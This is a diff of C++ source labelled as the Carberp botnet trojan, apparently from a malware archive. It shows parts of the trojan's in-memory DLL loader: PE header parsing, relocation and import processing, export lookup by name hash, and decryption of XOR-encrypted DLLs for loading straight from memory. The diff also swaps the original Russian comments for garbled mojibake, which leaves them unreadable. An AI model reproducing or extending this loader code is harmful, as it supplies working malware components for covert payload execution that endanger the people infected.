@@ -1,3 +1,14 @@
+/*
+  name      Carberp Botnet
+  type      trojan
+  cve       вЂ”
+  year      unknown
+  os        Windows
+  authors   unknown
+  source    krisyotam
+  archived  krisyotam (2026)
+  notes     вЂ”
+ */
 #include "MemoryDll.h"
 #include "LoaderUtils.h"
 
@@ -21,12 +32,12 @@ typedef BOOL ( WINAPI *DllEntryProc )( HINSTANCE hinstDLL, DWORD fdwReason, LPVO
 
 
 //--------------------------------------------------------
-//  Функция возвращает истину если буфер являетсяя DLL
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ DLL
 //--------------------------------------------------------
 bool BufferIsExecutableFile(LPVOID Buf)
 {
-	// Функция возвращает истину если буффер является заголовком
-	// exe файла
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+	// exe пїЅпїЅпїЅпїЅпїЅ
 	bool Result = false;
 	if (Buf)
 	{
@@ -144,7 +155,7 @@ void FinalizeSections( PMEMORYMODULE module )
 
 void ProcessRelocation(unsigned char *CodeBase, PIMAGE_NT_HEADERS Headers, DWORD Delta)
 {
-	// Функция обрабатывает смещения
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (!CodeBase || !Headers || !Delta)
 		return;
 
@@ -251,9 +262,9 @@ int BuildImportTable(PMEMORYMODULE module)
 
 	PIMAGE_DATA_DIRECTORY directory = GET_HEADER_DICTIONARY(module, IMAGE_DIRECTORY_ENTRY_IMPORT);
 
-	// Если у исполняемого файла нет импорта - это нормально.
-	// Например - в случае с LoaderDll
-	// Просто получается случай, когда не надо ничего настраивать.
+	// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ - пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅ LoaderDll
+	// пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ.
 	if ( directory->Size == 0 ) return 1;
 
 	if ( directory->Size <= 0 ) return 0;
@@ -489,8 +500,8 @@ FARPROC MemoryGetProcAddress(HMEMORYMODULE module, const char *name)
 
 
 //---------------------------------------------------
-//  Функция возвращает адрес экспортируемо функции
-//  по хэшу её имени
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
+//  пїЅпїЅ пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------
 FARPROC MemoryGetProcAddress(HMEMORYMODULE module, DWORD NameHash)
 {
@@ -558,16 +569,16 @@ bool BuildImport(PVOID ImageBase)
 
 
 //---------------------------------------------------------
-//  Функция расшифровывает длл
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //
-//  DllBuf - Указатель на исходный буфер длл
+//  DllBuf - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
 //
-//  Выходные параметры:
+//  пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ:
 //
-//  DllSize - размер расшифрованной длл
-//  NewBuf  - Указатель на буфер длл
-//  NewBufAllocated - Установится в истину, если
-//                    для буфера пришлось выделить память
+//  DllSize - пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//  NewBuf  - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅ пїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ
+//  NewBufAllocated - пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅ
+//                    пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 //---------------------------------------------------------
 bool DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufAllocated)
 {
@@ -577,10 +588,10 @@ bool DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufA
 	
 	if (!DllBuf) return false;
 
-	// Файл в исходном формате
+	// пїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 	if (BufferIsExecutableFile((LPVOID)DllBuf))
 	{
-		// Определяем размер длл файла
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 		PIMAGE_DOS_HEADER dos_header = (PIMAGE_DOS_HEADER)DllBuf;
 		PIMAGE_NT_HEADERS old_header = (PIMAGE_NT_HEADERS)&((const unsigned char *)(DllBuf))[dos_header->e_lfanew];;
 
@@ -588,33 +599,33 @@ bool DecodeDll(const void* DllBuf, DWORD &DllSize, LPVOID &NewBuf, bool &NewBufA
 				  old_header->OptionalHeader.SizeOfCode +
 				  old_header->OptionalHeader.SizeOfInitializedData;
 
-        // Копируем указатель
+        // пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 		NewBuf = (LPVOID)DllBuf;
 		return true;
 	}
 
-	// ДЛЛ зашифрована, расшифровываем
+	// пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ
 
 	PCHAR Buf = (PCHAR)DllBuf;
 	PCHAR Password = Buf;
 
-	// Проверяем маркер библиотеки. Наличие маркера в открытом виде
-	// означает, что данные длл находятся в окрытом виде
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ. пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ, пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅ пїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅ
 	NewBufAllocated = CalcHash(Buf, ENCRYPTED_DLL_MARKER_SIZE) != ENCRYPTED_DLL_MARKER_HASH;
 	Buf += ENCRYPTED_DLL_MARKER_SIZE;
 
-	// Получаем размер данных
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 	DllSize = *(PDWORD)Buf;
 	Buf += sizeof(DWORD);
 
 	if (NewBufAllocated)
 	{
-		// Расшифровываем данные
+		// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 
 		NewBuf = MemAlloc(DllSize);
 		if (NewBuf)
 		{
-			// Копируем данные
+			// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅпїЅ
 			m_memcpy(NewBuf, Buf, DllSize);
 			XORCrypt(Password, (LPBYTE)NewBuf, DllSize);
         }
@@ -645,7 +656,7 @@ HMEMORYMODULE MemoryLoadEncryptedLibrary( const void* DLL)
 	DWORD Size;
 	bool FreeBuf;
 
-	// Расшифровываем буфер
+	// пїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅпїЅ пїЅпїЅпїЅпїЅпїЅ
 	if (!DecodeDll(DLL, Size, DLLBuf,  FreeBuf))
 		return NULL;
 
